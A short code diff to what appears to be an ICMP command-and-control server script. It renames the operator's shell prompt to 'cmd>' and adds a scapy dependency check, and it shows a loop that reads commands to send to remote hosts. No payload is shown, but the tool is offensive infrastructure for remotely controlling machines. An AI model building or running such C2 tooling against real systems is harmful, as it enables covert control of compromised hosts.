@@ -32,7 +32,7 @@ def main():
     sniffing.start()
     print("[+]ICMP C2 started!")
     while True:
-        icmpshell = input("shell: ")
+        icmpshell = input("cmd> ")
         if icmpshell == 'exit':
             print("[+]Stopping ICMP C2...")
             sniffing.terminate()
@@ -45,4 +45,5 @@ def main():
     sniffing.join()
 
 if __name__ == "__main__":
+    check_scapy()
     main()
